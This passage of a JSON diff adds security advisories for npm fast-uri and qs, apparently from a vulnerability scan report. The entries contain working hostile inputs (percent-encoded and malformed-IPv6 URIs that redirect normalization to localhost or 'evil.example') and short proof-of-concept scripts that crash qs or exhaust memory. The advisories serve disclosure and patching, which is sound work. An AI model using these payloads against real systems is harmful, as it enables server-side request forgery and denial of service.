+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "fast-uri vulnerable to server-side request forgery via malformed IPv6 normalization"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-fph4-wmhf-6fwf/GHSA-fph4-wmhf-6fwf.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.4.1"
+                        },
+                        {
+                          "fixed": "2.4.5"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-fph4-wmhf-6fwf/GHSA-fph4-wmhf-6fwf.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.1.2"
+                        },
+                        {
+                          "fixed": "3.1.6"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-fph4-wmhf-6fwf/GHSA-fph4-wmhf-6fwf.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.1.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-75899"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-174",
+                  "CWE-918"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-02T15:42:39Z",
+                "nvd_published_at": "2026-08-24T10:16:39Z",
+                "severity": "HIGH"
+              },
+              "details": "### Impact\n\n`fast-uri` decodes a hostname's percent escapes twice in a single `normalize()` or `resolve()` call: once during parsing and again during authority recomposition. A nested percent-encoded host therefore survives the first decode and is turned into a live destination by the second, so `normalize('http://%256c%256f%2563%2561%256c%2568%256f%2573%2574/')` returns `http://localhost/`. Applications that normalize or resolve an untrusted URI before an SSRF check, redirect validation, or host allowlist can be steered to a different destination, including internal addresses such as loopback or a cloud metadata endpoint, than the encoded input appeared to contain. This is an incomplete-fix variant of CVE-2026-6322, whose encoded-authority-delimiter fix introduced the second decode.\n\n### Patches\n\nFixed in `fast-uri` 2.4.5, 3.1.6, and 4.1.3.\n\n### Workarounds\n\nReject untrusted URIs whose host component contains an encoded percent sign (`%25`) before passing them to `normalize()` or `resolve()`.",
+              "id": "GHSA-fph4-wmhf-6fwf",
+              "modified": "2026-09-03T16:25:59.437560740Z",
+              "published": "2026-09-02T15:42:39Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/security/advisories/GHSA-fph4-wmhf-6fwf"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-75899"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/2642290672e7211c990aaed3749c2ce667d0af4f"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/8c15dbe94ec50bb8e595791ebb42c35cef0fd304"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/ae92a4c5d8c4b6c9e447f048d5fcbde7eebd5514"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://cna.openjsf.org/security-advisories.html"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/fastify/fast-uri"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v2.4.5"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v3.1.6"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v4.1.3"
+                }
+              ],
+              "related": [
+                "CGA-4xq2-693h-hcc4"
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "fast-uri vulnerable to server-side request forgery via repeated hostname percent-decoding"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-jqff-g426-hqxp/GHSA-jqff-g426-hqxp.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.3.1"
+                        },
+                        {
+                          "fixed": "2.4.5"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-jqff-g426-hqxp/GHSA-jqff-g426-hqxp.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.1.6"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-jqff-g426-hqxp/GHSA-jqff-g426-hqxp.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.1.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-76172"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-177"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-02T15:41:53Z",
+                "nvd_published_at": "2026-08-24T11:16:40Z",
+                "severity": "HIGH"
+              },
+              "details": "### Impact\n\n`fast-uri` decodes percent-encoded characters in the scheme component with the legacy global `unescape()` and serializes the result back as raw characters, without re-escaping it or validating it as a scheme. A scheme that decodes to characters outside the RFC 3986 scheme grammar can therefore introduce structure the original input did not contain.\n\nFor example, `%2f%2fevil.example:/pwn` parses with no authority (`parse().host` is `undefined`), but `resolve()` and `normalize()` return `//evil.example:/pwn`, which reparses with host `evil.example`. The `%uXXXX` form (`%u002f%u002fevil.example:/pwn`) produces the same result, and a scheme containing `%0d%0a` reaches the output as a raw CR LF.\n\nApplications that normalize or resolve untrusted URLs before a redirect check, host allowlist, or outbound request decision, especially ones that treat a missing authority as same-origin, can be steered to an attacker-chosen authority, and a normalized URI placed in a response header can carry an injected CR LF.\n\n### Patches\n\nUpgrade to `fast-uri` \u003e= 4.1.3, or \u003e= 3.1.6 in the v3.x release line, or \u003e= 2.4.5 in the v2.x release line.\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+              "id": "GHSA-jqff-g426-hqxp",
+              "modified": "2026-09-03T16:25:58.800307586Z",
+              "published": "2026-09-02T15:41:53Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/security/advisories/GHSA-jqff-g426-hqxp"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-76172"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/37f3417c82994279656854f83ce938acd81c3862"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/a941e626411f576f8d90883231e57b6c9d0ff98b"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/c6a74bfd9d8c6b0df5362b3c7ae88d8021cb1e39"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://cna.openjsf.org/security-advisories.html"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/fastify/fast-uri"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v2.4.5"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v3.1.6"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v4.1.3"
+                }
+              ],
+              "related": [
+                "CGA-j2q7-83c7-99jg"
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "fast-uri vulnerable to host confusion via percent-encoded scheme normalization"
+            }
+          ]
         },
         {
           "package": {
@@ -40819,7 +41199,190 @@
             "name": "qs",
             "version": "6.15.3",
             "ecosystem": "npm"
-          }
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-4mjr-xmp4-gh2g"
+              ],
+              "aliases": [
+                "CVE-2026-82417",
+                "GHSA-4mjr-xmp4-gh2g"
+              ],
+              "max_severity": "6.3"
+            },
+            {
+              "ids": [
+                "GHSA-x5fp-wj9c-mxmx"
+              ],
+              "aliases": [
+                "CVE-2026-82562",
+                "GHSA-x5fp-wj9c-mxmx"
+              ],
+              "max_severity": "6.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-4mjr-xmp4-gh2g/GHSA-4mjr-xmp4-gh2g.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "qs",
+                    "purl": "pkg:npm/qs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.2.5"
+                        },
+                        {
+                          "fixed": "6.16.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-82417"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-248",
+                  "CWE-703"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-02T14:45:13Z",
+                "nvd_published_at": "2026-08-30T00:16:34Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\n`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` → `stringify` round-trip — no `JSON.parse` — turns an unauthenticated query string into an uncaught throw.\n\nAn attacker-controlled `parse` input reaches the host application's availability asset — via `qs`'s own recommended `plainObjects` mitigation — and triggers an uncaught exception during a `parse` → `stringify` round-trip.\n\n### Details\n`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\n```js\nif (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n```\n\n`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    return !!(obj.constructor \u0026\u0026 obj.constructor.isBuffer \u0026\u0026 obj.constructor.isBuffer(obj));\n};\n```\n\n`constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.\n\n\n### Trust Boundary Note\n\n`qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` — the standard round-trip in gateways and request-forwarders — then hits the unchecked call. \n\n\n### PoC\n`poc02c_isBuffer_qs_only_roundtrip.js` — pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nvar untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y\n\nvar parsed = qs.parse(untrustedQueryString, { plainObjects: true });\nconsole.log('[parse] kept constructor key:', JSON.stringify(parsed));\n\ntry {\n    qs.stringify(parsed);\n    console.log('[stringify] no throw (unexpected)');\n} catch (e) {\n    console.log('[stringify] DoS reproduced -\u003e', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02_isBuffer.js` — the minimal defect:\n\n```js\n'use strict';\nvar qs = require('qs');\ntry {\n    qs.stringify(JSON.parse('{\"a\":{\"constructor\":{\"isBuffer\":\"x\"}}}'));\n} catch (e) {\n    console.log('[A] DoS reproduced -\u003e', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02b_isBuffer_async_crash.js` — worker death in an async sink:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nfunction handleRequestAsync(clientJsonBody) {\n    try {\n        setImmediate(function () {                 // async continuation, outside the try\n            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught\n        });\n        console.log('[handler] returned 200 synchronously; async work scheduled');\n    } catch (e) {\n        console.log('[handler] caught synchronously (will NOT happen):', e.message);\n    }\n}\nprocess.on('exit', function (code) {\n    console.log('[proc] process exiting with code:', code);\n});\nhandleRequestAsync('{\"filters\":{\"constructor\":{\"isBuffer\":\"x\"}}}');\n```\n\n### Execution Steps\n\n```bash\ncd poc\nnpm install qs@6.15.3\nnode poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse-\u003estringify -\u003e TypeError\nnode poc02_isBuffer.js                      # minimal defect -\u003e TypeError inside stringify\nnode poc02b_isBuffer_async_crash.js         # async sink -\u003e uncaught throw -\u003e exit code 1\n```\n\n### Reproduction Evidence\n\n`poc02c_isBuffer_qs_only_roundtrip.js` :\n\n```\n[parse] kept constructor key: {\"x\":{\"constructor\":{\"isBuffer\":\"y\"}}}\n[stringify] DoS reproduced -\u003e TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02_isBuffer.js`:\n\n```\n[A] DoS reproduced -\u003e TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02b_isBuffer_async_crash.js` :\n\n```\n[handler] returned 200 synchronously; async work scheduled\n[proc] process exiting with code: 1\nTypeError: obj.constructor.isBuffer is not a function\n    at Object.isBuffer (.../qs/lib/utils.js:332:78)\n    at stringify (.../qs/lib/stringify.js:127:45)\n=== EXIT CODE: 1 ===\n```\n\nThe pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.\n\n### Impact\n\nAn unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.\n\n### Recommended Fix\n\nReplace the duck-type with a brand check mirroring `utils.isRegExp`:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    if (typeof Buffer !== 'undefined' \u0026\u0026 typeof Buffer.isBuffer === 'function') {\n        return Buffer.isBuffer(obj);\n    }\n    return Object.prototype.toString.call(obj) === '[object Uint8Array]';\n};\n```\n\nIf duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`.",
+              "id": "GHSA-4mjr-xmp4-gh2g",
+              "modified": "2026-09-03T16:25:59.169424867Z",
+              "published": "2026-09-02T14:45:13Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/security/advisories/GHSA-4mjr-xmp4-gh2g"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-82417"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/commit/e83d321ffafb38cf210683ac31714fce6ce1c6c6"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/ljharb/qs"
+                }
+              ],
+              "related": [
+                "CGA-cqff-7h6x-66mj"
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "qs: Denial of Service via Attacker Controlled isBuffer"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 6.15.3",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-x5fp-wj9c-mxmx/GHSA-x5fp-wj9c-mxmx.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "qs",
+                    "purl": "pkg:npm/qs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "6.14.2"
+                        },
+                        {
+                          "fixed": "6.16.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-82562"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-770"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-02T14:46:57Z",
+                "nvd_published_at": "2026-08-30T01:20:32Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\n`qs` `v6.15.3` allows bracket-key input to bypass `arrayLimit` and `throwOnLimitExceeded` when `comma: true`. The input `a[]=1,2,3,4` succeeds with `arrayLimit: 3`, while the equivalent plain-key input is rejected.\n\nAffected version tested:\n\n```text\nqs v6.15.3\ncommit 18d085e919dae70c8f1b200ab99323058edab2c2\n```\n\n### Details\n\n`parseArrayValue()` enforces the comma limit only for flat values. The `a[]` form is marked non-flat, so its comma-separated value is wrapped after parsing and the inner array is not checked. A single parameter can therefore materialize arbitrarily large arrays.\n\n### PoC\n\n```js\nconst qs = require('qs')\nconst options = { comma: true, arrayLimit: 3, throwOnLimitExceeded: true }\n\nconst result = qs.parse('a[]=1,2,3,4', options)\nconsole.log(result.a[0].length) // 4; expected RangeError\n\nconst big = qs.parse('a[]=' + '1,'.repeat(1000000) + '1', { comma: true, arrayLimit: 20 })\nconsole.log(big.a[0].length) // 1000001\n```\n\nOn `v6.15.3`, the first input parses successfully and the second creates an array with 1,000,001 elements. The equivalent `a=1,2,3,4` input throws `RangeError` as expected.\n\n### Impact\n\nAn attacker who can supply a query string or form body can bypass configured array limits and force excessive memory allocation, causing denial of service. The limit must be applied after comma splitting and before the resulting array is wrapped.",
+              "id": "GHSA-x5fp-wj9c-mxmx",
+              "modified": "2026-09-03T16:25:59.599538782Z",
+              "published": "2026-09-02T14:46:57Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/security/advisories/GHSA-w7fw-mjwx-w883"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/security/advisories/GHSA-x5fp-wj9c-mxmx"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-82562"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/commit/8859c37470e11b42b547b275e4e9bd0bc8cc5464"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/ljharb/qs"
+                }
+              ],
+              "related": [
+                "CGA-763c-8493-c8p4",
+                "CVE-2026-82562"
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "qs array-limit bypass via bracket-key comma parsing"
+            }
+          ]
         },
         {
           "package": {
@@ -63411,7 +63974,621 @@
             "name": "fast-uri",
             "version": "3.1.5",
             "ecosystem": "npm"
-          }
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-5jgf-p345-68v8"
+              ],
+              "aliases": [
+                "CVE-2026-75931",
+                "GHSA-5jgf-p345-68v8"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
+                "GHSA-f65p-4m7j-42xc"
+              ],
+              "aliases": [
+                "CVE-2026-75975",
+                "GHSA-f65p-4m7j-42xc"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
+                "GHSA-fph4-wmhf-6fwf"
+              ],
+              "aliases": [
+                "CVE-2026-75899",
+                "GHSA-fph4-wmhf-6fwf"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
+                "GHSA-jqff-g426-hqxp"
+              ],
+              "aliases": [
+                "CVE-2026-76172",
+                "GHSA-jqff-g426-hqxp"
+              ],
+              "max_severity": "7.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-5jgf-p345-68v8/GHSA-5jgf-p345-68v8.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.4.2"
+                        },
+                        {
+                          "fixed": "2.4.5"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-5jgf-p345-68v8/GHSA-5jgf-p345-68v8.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.1.3"
+                        },
+                        {
+                          "fixed": "3.1.6"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-5jgf-p345-68v8/GHSA-5jgf-p345-68v8.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.1"
+                        },
+                        {
+                          "fixed": "4.1.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-75931"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-436"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-02T15:44:30Z",
+                "nvd_published_at": "2026-08-24T10:16:40Z",
+                "severity": "HIGH"
+              },
+              "details": "### Impact\n\n`fast-uri` canonicalizes a host to its ASCII form only when the input carries an explicit scheme. When `resolve()` resolves a scheme-relative reference (`//host/`) against a scheme-bearing base, it still emits the host verbatim even though the effective scheme is known, so re-parsing the resolved URI yields a different host than the one `resolve()` returned. An application that resolves an untrusted reference with `fast-uri` and then checks or routes on the resulting host can make a policy decision on one host and reach another. This is an incomplete-fix variant of CVE-2026-13676, whose IDN canonicalization was applied only to the scheme-bearing form.\n\n### Patches\n\nUpgrade to `fast-uri` 2.4.5, 3.1.6, or 4.1.3. `resolve()` now canonicalizes the host once the effective scheme is known, and fails closed if a raw non-ASCII host cannot be converted.\n\n### Workarounds\n\nResolve scheme-relative references against a base that carries a scheme before performing any host-policy or origin check.",
+              "id": "GHSA-5jgf-p345-68v8",
+              "modified": "2026-09-03T16:25:59.089522632Z",
+              "published": "2026-09-02T15:44:30Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/security/advisories/GHSA-5jgf-p345-68v8"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-75931"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/0256bc8d1f28b5d0ac657faf67e2411a189dfcb5"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/444ecdad447db2cc23c4d422acc6f0daa6fa8eef"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/4e4ebd8b245f6ca16e448203559eea3e545453a3"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://cna.openjsf.org/security-advisories.html"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/fastify/fast-uri"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v2.4.5"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v3.1.6"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v4.1.3"
+                }
+              ],
+              "related": [
+                "CGA-956q-rj3q-c674"
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "fast-uri vulnerable to host confusion via skipped IDN canonicalization on scheme-relative references"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-f65p-4m7j-42xc/GHSA-f65p-4m7j-42xc.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.3.1"
+                        },
+                        {
+                          "fixed": "2.4.5"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-f65p-4m7j-42xc/GHSA-f65p-4m7j-42xc.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.1.6"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-f65p-4m7j-42xc/GHSA-f65p-4m7j-42xc.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.1.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-75975"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-20",
+                  "CWE-918"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-02T15:43:30Z",
+                "nvd_published_at": "2026-08-24T10:16:40Z",
+                "severity": "HIGH"
+              },
+              "details": "### Impact\n\n`fast-uri` does not validate the complete RFC 3986 grammar for bracketed IPv6 literals, so a malformed literal with invalid trailing text is silently truncated to a different valid IPv6 address with no error reported. For example, `normalize('http://[::not-valid]/private')` returns `http://[::]/private`, and `[fc00::not-hex]` and `[fe80::not-hex]` collapse to `[fc00::]` and `[fe80::]`. An application that normalizes an untrusted URL before an outbound request, redirect, or host-policy check can be routed to a local or private address such as loopback (`::1`), unique-local, or link-local. Because `parse().error` is unset for these inputs, checking it does not protect the consumer.\n\n### Patches\n\nUpgrade to `fast-uri` 2.4.5, 3.1.6, or 4.1.3. Malformed IPv6 literals are now rejected with a host error instead of being normalized to a valid address.\n\n### Workarounds\n\nReject untrusted URLs whose host is a bracketed IPv6 literal before passing them to `fast-uri`, or route outbound requests against an explicit allowlist of addresses rather than trusting the normalized host.",
+              "id": "GHSA-f65p-4m7j-42xc",
+              "modified": "2026-09-03T16:25:59.227899335Z",
+              "published": "2026-09-02T15:43:30Z",
+              "references": [
+                {
